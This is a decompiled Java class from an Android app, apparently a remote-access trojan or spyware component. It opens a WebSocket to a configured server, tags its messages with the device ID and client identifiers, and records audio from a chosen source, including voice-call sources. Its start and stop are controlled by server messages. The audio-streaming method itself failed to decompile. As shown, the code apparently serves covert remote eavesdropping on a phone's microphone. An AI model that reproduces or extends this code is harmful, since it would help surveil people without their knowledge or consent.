/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.content.Context
 *  android.media.AudioRecord
 *  android.media.audiofx.AcousticEchoCanceler
 *  okhttp3.OkHttpClient
 *  okhttp3.Request
 *  okhttp3.Request$Builder
 *  okhttp3.Response
 *  okhttp3.WebSocket
 *  okhttp3.WebSocketListener
 *  org.json.JSONException
 *  org.json.JSONObject
 */
package linker.resourcer.encoder;

import android.content.Context;
import android.media.AudioRecord;
import android.media.audiofx.AcousticEchoCanceler;
import androidx.core.app.ActivityCompat;
import linker.resourcer.encoder.ConfigurationConstants;
import linker.resourcer.encoder.SharedPreferencesManager;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;
import org.json.JSONException;
import org.json.JSONObject;

public class Microphone {
    static int aud;
    static int ch;
    private static OkHttpClient client;
    private static boolean isActive;
    private static boolean isPause;
    private static int newRate;
    private static int newSo;
    public static WebSocket ws;

    static {
        isActive = false;
        isPause = false;
        ch = 2;
        aud = 2;
    }

    public static void ChangeRate(int n) {
        newRate = n;
    }

    public static void ChangeSrc(int n) {
        newSo = n;
    }

    public static void Pause(boolean bl) {
        isPause = bl;
    }

    public static void Start(String string2, String string3, String string4, Context context) {
        new Thread(new Runnable(){
            final String val$audiorate;
            final Context val$ctx;
            final String val$sokidf;
            final String val$source;
            {
                this.val$source = string2;
                this.val$audiorate = string3;
                this.val$ctx = context;
                this.val$sokidf = string4;
            }

            @Override
            public void run() {
                Microphone.access$002(new OkHttpClient());
                Request request = new Request.Builder().url(ConfigurationConstants.URL_SOCKT()).build();
                ws = client.newWebSocket(request, new WebSocketListener(this){
                    final 1 this$0;
                    {
                        this.this$0 = var1_1;
                    }

                    private void Livemessage(Context object, String string2, String string3, String string4) {
                        if (ws != null) {
                            String string5;
                            String string6;
                            block7: {
                                string6 = SharedPreferencesManager.Read(object, "ID", "Deviceid");
                                String string7 = SharedPreferencesManager.Read(object, ConfigurationConstants.THE_IDF, null);
                                string5 = SharedPreferencesManager.Read(object, ConfigurationConstants.THE_CIP, "null");
                                object = string7;
                                if (!string3.equals("null")) {
                                    object = string3;
                                }
                                if (string6 == null) {
                                    return;
                                }
                                if (object != null) break block7;
                                return;
                            }
                            try {
                                string3 = new JSONObject();
                                string3.put("idf", object);
                                string3.put("pid", (Object)string6);
                                string3.put("itype", (Object)"Slr_client");
                                string3.put("subc", (Object)"msg");
                                string3.put("msg", (Object)string2);
                                string3.put("cip", (Object)string5);
                                string3.put("conk", (Object)string4);
                                ws.send(string3.toString());
                            }
                            catch (JSONException jSONException) {
                                jSONException.printStackTrace();
                            }
                        }
                    }

                    static /* synthetic */ void access$500(1 var0, Context context, String string2, String string3, String string4) {
                        var0.Livemessage(context, string2, string3, string4);
                    }

                    AudioRecord initializeRecorder(int n, int n2, AudioRecord audioRecord, int n3) {
                        if (ActivityCompat.checkSelfPermission(this.this$0.val$ctx, "android.permission.RECORD_AUDIO") != 0) {
                            return null;
                        }
                        if (audioRecord != null) {
                            audioRecord.stop();
                            audioRecord.release();
                        }
                        switch (n) {
                            default: {
                                audioRecord = new AudioRecord(0, n2, ch, aud, n3);
                                break;
                            }
                            case 4: {
                                audioRecord = new AudioRecord(5, n2, ch, aud, n3);
                                break;
                            }
                            case 3: {
                                audioRecord = new AudioRecord(7, n2, ch, aud, n3);
                                break;
                            }
                            case 2: {
                                audioRecord = new AudioRecord(6, n2, ch, aud, n3);
                                break;
                            }
                            case 1: {
                                audioRecord = new AudioRecord(1, n2, ch, aud, n3);
                            }
                        }
                        try {
                            AcousticEchoCanceler.create((int)audioRecord.getAudioSessionId());
                        }
                        catch (Exception exception) {
                            exception.printStackTrace();
                        }
                        audioRecord.startRecording();
                        return audioRecord;
                    }

                    public void killall() {
                        Microphone.access$102(false);
                        try {
                            if (ws != null) {
                                ws.cancel();
                                ws = null;
                            }
                            if (client != null) {
                                client.dispatcher().cancelAll();
                                client.connectionPool().evictAll();
                                client.dispatcher().executorService().shutdown();
                                Microphone.access$002(null);
                            }
                        }
                        catch (Exception exception) {
                            // empty catch block
                        }
                    }

                    public void onClosing(WebSocket webSocket, int n, String string2) {
                        super.onClosing(webSocket, n, string2);
                        this.killall();
                    }

                    public void onFailure(WebSocket webSocket, Throwable throwable, Response response) {
                        super.onFailure(webSocket, throwable, response);
                        this.killall();
                    }

                    public void onMessage(WebSocket object, String string2) {
                        super.onMessage((WebSocket)object, string2);
                        try {
                            object = new JSONObject(string2);
                            object = object.optString("type", "empty");
                            if (((String)object).equals("stop") || ((String)object).equals("Unauthorized access")) {
                                this.killall();
                            }
                        }
                        catch (Exception exception) {
                            // empty catch block
                        }
                    }

                    public void onOpen(WebSocket webSocket, Response response) {
                        new Thread(this){
                            final 1 this$1;
                            {
                                this.this$1 = var1_1;
                            }

                            /*
                             * Exception decompiling
                             */
                            @Override
                            public void run() {
                                /*
                                 * This method has failed to decompile.  When submitting a bug report, please provide this stack trace, and (if you hold appropriate legal rights) the relevant class file.
                                 * 
                                 * org.benf.cfr.reader.util.ConfusedCFRException: Back jump on a try block [egrp 32[TRYBLOCK] [55 : 630->633)] java.lang.Throwable
                                 *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op02WithProcessedDataAndRefs.insertExceptionBlocks(Op02WithProcessedDataAndRefs.java:2283)
                                 *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisInner(CodeAnalyser.java:415)
                                 *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisOrWrapFail(CodeAnalyser.java:278)
                                 *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysis(CodeAnalyser.java:201)
                                 *     at org.benf.cfr.reader.entities.attributes.AttributeCode.analyse(AttributeCode.java:94)
                                 *     at org.benf.cfr.reader.entities.Method.analyse(Method.java:531)
                                 *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1055)
                                 *     at org.benf.cfr.reader.entities.ClassFile.analyseInnerClassesPass1(ClassFile.java:923)
                                 *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1035)
                                 *     at org.benf.cfr.reader.entities.ClassFile.analyseInnerClassesPass1(ClassFile.java:923)
                                 *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1035)
                                 *     at org.benf.cfr.reader.entities.ClassFile.analyseInnerClassesPass1(ClassFile.java:923)
                                 *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1035)
                                 *     at org.benf.cfr.reader.entities.ClassFile.analyseTop(ClassFile.java:942)
                                 *     at org.benf.cfr.reader.Driver.doJarVersionTypes(Driver.java:257)
                                 *     at org.benf.cfr.reader.Driver.doJar(Driver.java:139)
                                 *     at org.benf.cfr.reader.CfrDriverImpl.analyse(CfrDriverImpl.java:76)
                                 *     at org.benf.cfr.reader.Main.main(Main.java:54)
                                 */
                                throw new IllegalStateException("Decompilation failed");
                            }
                        }.start();
                    }
                });
            }
        }).start();
    }

    public static void Stop() {
        isActive = false;
        try {
            if (ws != null) {
                ws.cancel();
                ws = null;
            }
            if (client != null) {
                client.dispatcher().cancelAll();
                client.connectionPool().evictAll();
                client.dispatcher().executorService().shutdown();
                client = null;
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    static /* synthetic */ OkHttpClient access$002(OkHttpClient okHttpClient) {
        client = okHttpClient;
        return okHttpClient;
    }

    static /* synthetic */ boolean access$100() {
        return isActive;
    }

    static /* synthetic */ boolean access$102(boolean bl) {
        isActive = bl;
        return bl;
    }

    static /* synthetic */ int access$200() {
        return newSo;
    }

    static /* synthetic */ int access$202(int n) {
        newSo = n;
        return n;
    }

    static /* synthetic */ int access$300() {
        return newRate;
    }

    static /* synthetic */ int access$302(int n) {
        newRate = n;
        return n;
    }

    static /* synthetic */ boolean access$400() {
        return isPause;
    }
}

